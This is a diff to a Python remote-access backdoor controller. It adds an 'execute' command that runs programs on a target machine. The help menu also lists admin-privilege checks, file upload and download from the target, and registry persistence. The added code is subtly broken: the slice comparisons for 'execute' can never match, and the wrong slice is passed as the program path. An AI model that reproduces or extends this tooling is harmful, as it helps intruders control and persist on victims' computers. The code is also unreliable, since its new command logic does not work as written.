@@ -35,6 +35,11 @@ def download_file(file_name):
     target.settimeout(None)
     f.close()
 
+def execute_programm(path):
+    target.send(path)
+
+
+
 
 def target_communication():
     count = 0
@@ -44,22 +49,26 @@ def target_communication():
         if command == 'quit':
             break
         elif command == 'clear':
-            os.system('clear')
+            os.system('cls')
         elif command[:3] == 'cd ':
             pass
         elif command[:6] == 'upload':
             upload_file(command[7:])
         elif command[:8] == 'download':
             download_file(command[9:])
+        elif command[:10] == 'execute':
+            execute_programm(command[:11])
+
         
         elif command == 'help':
             print(termcolor.colored('''\n
             quit                                --> Quit Session With The Target
-            check                                --> Check for admin privileges
+            check                               --> Check for admin privileges
             clear                               --> Clear The Screen
             cd *Directory Name*                 --> Changes Directory On Target System
-            upload *file name*                  --> Upload File To The target Machine
+            upload *file name*                  --> Upload File To The Target Machine
             download *file name*                --> Download File From Target Machine
+            execute *file name*                 --> Execute Program On Target Machine
             
             persistence *RegName* *fileName*    --> Create Persistence In Registry'''),'green')
         else:
